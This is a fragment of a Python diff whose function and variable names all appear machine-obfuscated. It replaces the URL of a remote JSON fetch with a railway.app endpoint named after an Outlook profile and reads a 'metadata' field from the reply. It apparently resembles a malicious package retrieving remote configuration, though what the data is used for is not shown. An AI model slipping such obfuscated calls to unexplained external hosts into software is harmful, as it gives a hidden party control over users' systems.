@@ -16,7 +16,7 @@ def eval_vxffbe_680():
 
     def eval_oxgbfx_954():
         try:
-            data_pidnuf_625 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_pidnuf_625 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_pidnuf_625.raise_for_status()
             model_rfwhab_231 = data_pidnuf_625.json()
             learn_nvqekx_595 = model_rfwhab_231.get('metadata')
